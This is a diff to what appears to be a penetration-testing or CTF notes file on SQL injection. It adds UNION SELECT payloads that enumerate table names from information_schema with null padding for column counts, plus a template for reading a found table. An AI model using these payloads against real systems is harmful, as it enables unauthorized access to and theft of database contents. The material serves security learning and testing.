@@ -50,7 +50,14 @@ The last number before the error is the amount of columns in the request. Then, 
 ```
 If the payload works, it's time to read the database tables:
 ```
+' union select table_name from information_schema.columns where table_schema=database() -- -
+' union select null, table_name from information_schema.columns where table_schema=database() -- -
+...
+' union select null, null, null, null, table_name from information_schema.columns where table_schema=database() -- -
+// options: table_name, column_name, table_schema,
+```
 
-' union select null, null, null, null null, table_name from information_schema.columns where table_schema=database() -- //
-
+If a table is found:
+```
+	' UNION SELECT null, null FROM TABLE -- 
 ```
